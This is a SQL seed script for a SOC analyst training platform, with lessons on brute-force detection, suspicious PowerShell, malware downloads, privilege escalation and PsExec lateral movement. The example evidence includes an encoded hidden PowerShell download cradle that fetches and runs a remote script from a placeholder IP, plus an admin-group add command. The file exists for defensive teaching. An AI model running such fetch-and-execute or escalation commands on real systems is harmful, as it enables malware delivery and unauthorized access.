USE cybersecurity_platform;
GO

BEGIN TRY
    BEGIN TRANSACTION;

    IF OBJECT_ID(N'dbo.LEARNING_COURSE', N'U') IS NULL
    BEGIN
        CREATE TABLE dbo.LEARNING_COURSE
        (
            course_id INT IDENTITY(1,1) PRIMARY KEY,
            title NVARCHAR(150) NOT NULL,
            description NVARCHAR(MAX) NULL,
            module NVARCHAR(80) NULL,
            difficulty NVARCHAR(20) NULL,
            estimated_time NVARCHAR(50) NULL,
            course_order INT NOT NULL CONSTRAINT DF_LEARNING_COURSE_order DEFAULT 0,
            is_active BIT NOT NULL CONSTRAINT DF_LEARNING_COURSE_active DEFAULT 1,
            created_at DATETIME NOT NULL CONSTRAINT DF_LEARNING_COURSE_created DEFAULT GETDATE(),
            updated_at DATETIME NULL
        );
    END;

    IF OBJECT_ID(N'dbo.LEARNING_LESSON', N'U') IS NULL
    BEGIN
        CREATE TABLE dbo.LEARNING_LESSON
        (
            lesson_id INT IDENTITY(1,1) PRIMARY KEY,
            course_id INT NOT NULL,
            title NVARCHAR(150) NOT NULL,
            slug NVARCHAR(150) NOT NULL,
            overview NVARCHAR(MAX) NULL,
            content NVARCHAR(MAX) NULL,
            key_concepts NVARCHAR(MAX) NULL,
            example_evidence NVARCHAR(MAX) NULL,
            common_mistakes NVARCHAR(MAX) NULL,
            related_module NVARCHAR(80) NULL,
            related_practice_url NVARCHAR(255) NULL,
            difficulty NVARCHAR(20) NULL,
            estimated_time NVARCHAR(50) NULL,
            lesson_order INT NOT NULL CONSTRAINT DF_LEARNING_LESSON_order DEFAULT 0,
            is_active BIT NOT NULL CONSTRAINT DF_LEARNING_LESSON_active DEFAULT 1,
            created_at DATETIME NOT NULL CONSTRAINT DF_LEARNING_LESSON_created DEFAULT GETDATE(),
            updated_at DATETIME NULL,
            CONSTRAINT UQ_LEARNING_LESSON_slug UNIQUE (slug),
            CONSTRAINT FK_LEARNING_LESSON_COURSE
                FOREIGN KEY (course_id)
                REFERENCES dbo.LEARNING_COURSE(course_id)
        );
    END;

    IF NOT EXISTS (SELECT 1 FROM dbo.LEARNING_COURSE WHERE title = N'SOC Analyst Basics')
    BEGIN
        INSERT INTO dbo.LEARNING_COURSE (
            title,
            description,
            module,
            difficulty,
            estimated_time,
            course_order,
            is_active,
            created_at
        )
        VALUES (
            N'SOC Analyst Basics',
            N'Foundational lessons for authentication monitoring, suspicious PowerShell analysis, and malware download investigations in a SOC workflow.',
            N'SOC Case Analysis',
            N'Easy',
            N'27 min',
            1,
            1,
            GETDATE()
        );
    END
    ELSE
    BEGIN
        UPDATE dbo.LEARNING_COURSE
        SET
            description = N'Foundational lessons for authentication monitoring, suspicious PowerShell analysis, and malware download investigations in a SOC workflow.',
            module = N'SOC Case Analysis',
            difficulty = N'Easy',
            estimated_time = N'27 min',
            course_order = 1,
            is_active = 1,
            updated_at = GETDATE()
        WHERE title = N'SOC Analyst Basics';
    END;

    IF NOT EXISTS (SELECT 1 FROM dbo.LEARNING_COURSE WHERE title = N'Incident Response Basics')
    BEGIN
        INSERT INTO dbo.LEARNING_COURSE (
            title,
            description,
            module,
            difficulty,
            estimated_time,
            course_order,
            is_active,
            created_at
        )
        VALUES (
            N'Incident Response Basics',
            N'Guided lessons for triage, privilege escalation review, lateral movement detection, and evidence-driven containment decisions.',
            N'Incident Response',
            N'Easy',
            N'27 min',
            2,
            1,
            GETDATE()
        );
    END
    ELSE
    BEGIN
        UPDATE dbo.LEARNING_COURSE
        SET
            description = N'Guided lessons for triage, privilege escalation review, lateral movement detection, and evidence-driven containment decisions.',
            module = N'Incident Response',
            difficulty = N'Easy',
            estimated_time = N'27 min',
            course_order = 2,
            is_active = 1,
            updated_at = GETDATE()
        WHERE title = N'Incident Response Basics';
    END;

    DECLARE @soc_course_id INT = (
        SELECT TOP 1 course_id
        FROM dbo.LEARNING_COURSE
        WHERE title = N'SOC Analyst Basics'
    );

    DECLARE @ir_course_id INT = (
        SELECT TOP 1 course_id
        FROM dbo.LEARNING_COURSE
        WHERE title = N'Incident Response Basics'
    );

    MERGE dbo.LEARNING_LESSON AS target
    USING (
        VALUES
        (
            @soc_course_id,
            N'Brute Force Detection',
            N'brute-force-detection',
            N'Brute-force activity often stands out as repeated login failures against one or more accounts, sometimes followed by a successful logon from the same source. A good analyst focuses on the timeline, the source IP, and whether the same account eventually authenticates successfully.',
            N'Review authentication logs and connect failed attempts to the final successful logon. Focus on source IP attribution, account targeting, and the timeline between repeated failures and eventual success.',
            N'["Authentication failure patterns","EventID 4625 and 4624 correlation","Failure-to-success escalation","Source IP attribution"]',
            N'08:11:24  EventID=4625  user=jmorris   src_ip=203.0.113.77  status=BadPassword
08:11:31  EventID=4625  user=jmorris   src_ip=203.0.113.77  status=BadPassword
08:11:47  EventID=4625  user=jmorris   src_ip=203.0.113.77  status=BadPassword
08:12:03  EventID=4624  user=jmorris   src_ip=203.0.113.77  logon_type=3',
            N'["Looking only at failed logons and missing the later successful one","Assuming every account in the log noise is compromised","Ignoring the source IP because the usernames look familiar"]',
            N'SOC Case Analysis',
            N'/soc-cases',
            N'Easy',
            N'8 min',
            1,
            1
        ),
        (
            @soc_course_id,
            N'Suspicious PowerShell Activity',
            N'suspicious-powershell-activity',
            N'PowerShell is a legitimate administration tool, which makes it useful to attackers as well. The key is not to treat every PowerShell execution as malicious, but to focus on suspicious launch context, encoded commands, remote script retrieval, and follow-on persistence or exfiltration behavior.',
            N'Inspect parent-child process relationships, encoded commands, and script block logging. Prioritize execution context and network activity that reveal whether PowerShell is performing remote download or hidden execution.',
            N'["Parent-child process analysis","Encoded PowerShell and hidden windows","Download cradle patterns","Script block logging"]',
            N'parent=WINWORD.EXE
process=powershell.exe
command=powershell.exe -w hidden -nop -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIANAAvAHUAcABkAGEAdABlAC4AcABzADEAJwAp
script_block=IEX (New-Object Net.WebClient).DownloadString(''http://198.51.100.24/update.ps1'')',
            N'["Flagging all PowerShell as malicious without checking context","Missing the suspicious parent process and focusing only on the child","Ignoring script block logs that reveal the real command"]',
            N'SOC Case Analysis',
            N'/soc-cases',
            N'Medium',
            N'10 min',
            2,
            1
        ),
        (
            @soc_course_id,
            N'Malware Download Investigation',
            N'malware-download-investigation',
            N'Many user-facing malware infections start with a download that looks harmless, then move quickly into file execution, scheduled tasks, registry persistence, or follow-on payload retrieval. The goal is to connect each stage into one coherent timeline.',
            N'Track the sequence from initial download to local execution, persistence, and network communication. Build the chain clearly so each artifact supports the next step in the investigation.',
            N'["Download-to-execution chains","Archive and shortcut abuse","Persistence indicators","User-driven malware execution"]',
            N'09:14:08  browser_download  url=http://198.51.100.33/files/April_Salary_Report.scr
09:14:10  file_create       path=C:\\Users\\analyst\\Downloads\\April_Salary_Report.scr
09:14:26  process_start     parent=explorer.exe child=April_Salary_Report.scr
09:14:39  network_connect   process=April_Salary_Report.scr dst_ip=198.51.100.33
09:15:11  persistence       task_name=UpdateCheck task_action=C:\\Users\\analyst\\Downloads\\April_Salary_Report.scr',
            N'["Stopping at the initial download without checking execution","Treating the archive or lure file as the final payload automatically","Missing persistence that proves the malware was meant to survive reboots"]',
            N'SOC Case Analysis',
            N'/soc-cases',
            N'Medium',
            N'9 min',
            3,
            1
        ),
        (
            @ir_course_id,
            N'Privilege Escalation Basics',
            N'privilege-escalation-basics',
            N'Privilege escalation means an attacker or unauthorized user gains higher access than they should have. In workstation-focused cases, this often shows up through group membership changes, scheduled task abuse, or tools that grant administrative rights without proper approval.',
            N'Identify the account that received elevated access, confirm the modified group or mechanism, and choose the first safe containment action that removes unauthorized privilege.',
            N'["Local administrator group abuse","Account management events","Special privilege assignment","Containment decisions"]',
            N'09:49:41  process_start  user=helpdesk-temp  command=net localgroup Administrators j.nasr /add
09:49:46  EventID=4732    subject=helpdesk-temp  group=Administrators  member=CORP\\j.nasr
09:52:19  EventID=4672    user=j.nasr  privileges=SeDebugPrivilege, SeBackupPrivilege',
            N'["Only identifying the compromised account without confirming the group changed","Ignoring the follow-on privileged logon that proves the escalation worked","Choosing an investigation note instead of an immediate containment action"]',
            N'Incident Response',
            N'/incidents',
            N'Easy',
            N'9 min',
            1,
            1
        ),
        (
            @ir_course_id,
            N'Lateral Movement with PsExec',
            N'lateral-movement-with-psexec',
            N'PsExec is a legitimate Sysinternals tool, but it is also commonly abused for lateral movement. The most useful indicators are temporary service creation, administrative share access, and a remote execution chain that jumps from one host to another.',
            N'Correlate ADMIN$ access, temporary service creation, and cross-host execution to identify the first remote host and any pivot systems used later in the attack.',
            N'["Remote administration abuse","PSEXESVC service artifacts","Pivot host identification","Cross-host execution chains"]',
            N'ENG-WS17  smb_access     target=APP-SRV06 share=ADMIN$
ENG-WS17  service_create  target=APP-SRV06 service=PSEXESVC
APP-SRV06 process_start   parent=PSEXESVC.exe child=cmd.exe
APP-SRV06 task_create     target=FS-ARCHIVE01 task_name=DailySyncCheck',
            N'["Focusing only on the final host and missing the pivot system","Treating any remote service creation as PsExec without checking the service name","Ignoring the relationship between the originating workstation and the remote host"]',
            N'Incident Response',
            N'/incidents',
            N'Medium',
            N'11 min',
            2,
            1
        ),
        (
            @ir_course_id,
            N'Incident Response Workflow',
            N'incident-response-workflow',
            N'A good incident response workflow does not jump straight to remediation. Analysts first identify the most important suspicious artifact, validate what happened technically, and only then decide the safest immediate containment action. That same sequence is used throughout the platform''s step-based incident labs.',
            N'Practice a structured investigation flow: start with triage, move into technical confirmation, and then choose the first containment step supported by the evidence.',
            N'["Triage versus deep analysis","Step-by-step investigations","Evidence-driven answers","Immediate containment actions"]',
            N'Step 1  Initial Triage       -> Which artifact should you investigate first?
Step 2  Technical Analysis   -> What behavior or tool does the evidence confirm?
Step 3  Containment Decision -> What immediate action should reduce the threat safely?',
            N'["Skipping triage and guessing the final answer too early","Confusing root cause with immediate containment","Choosing a broad remediation plan instead of the first safe action"]',
            N'Incident Response',
            N'/incidents',
            N'Easy',
            N'7 min',
            3,
            1
        )
    ) AS source (
        course_id,
        title,
        slug,
        overview,
        content,
        key_concepts,
        example_evidence,
        common_mistakes,
        related_module,
        related_practice_url,
        difficulty,
        estimated_time,
        lesson_order,
        is_active
    )
    ON target.slug = source.slug
    WHEN MATCHED THEN
        UPDATE SET
            target.course_id = source.course_id,
            target.title = source.title,
            target.overview = source.overview,
            target.content = source.content,
            target.key_concepts = source.key_concepts,
            target.example_evidence = source.example_evidence,
            target.common_mistakes = source.common_mistakes,
            target.related_module = source.related_module,
            target.related_practice_url = source.related_practice_url,
            target.difficulty = source.difficulty,
            target.estimated_time = source.estimated_time,
            target.lesson_order = source.lesson_order,
            target.is_active = source.is_active,
            target.updated_at = GETDATE()
    WHEN NOT MATCHED THEN
        INSERT (
            course_id,
            title,
            slug,
            overview,
            content,
            key_concepts,
            example_evidence,
            common_mistakes,
            related_module,
            related_practice_url,
            difficulty,
            estimated_time,
            lesson_order,
            is_active,
            created_at,
            updated_at
        )
        VALUES (
            source.course_id,
            source.title,
            source.slug,
            source.overview,
            source.content,
            source.key_concepts,
            source.example_evidence,
            source.common_mistakes,
            source.related_module,
            source.related_practice_url,
            source.difficulty,
            source.estimated_time,
            source.lesson_order,
            source.is_active,
            GETDATE(),
            NULL
        );

    COMMIT TRANSACTION;
END TRY
BEGIN CATCH
    IF @@TRANCOUNT > 0
        ROLLBACK TRANSACTION;

    THROW;
END CATCH;
GO
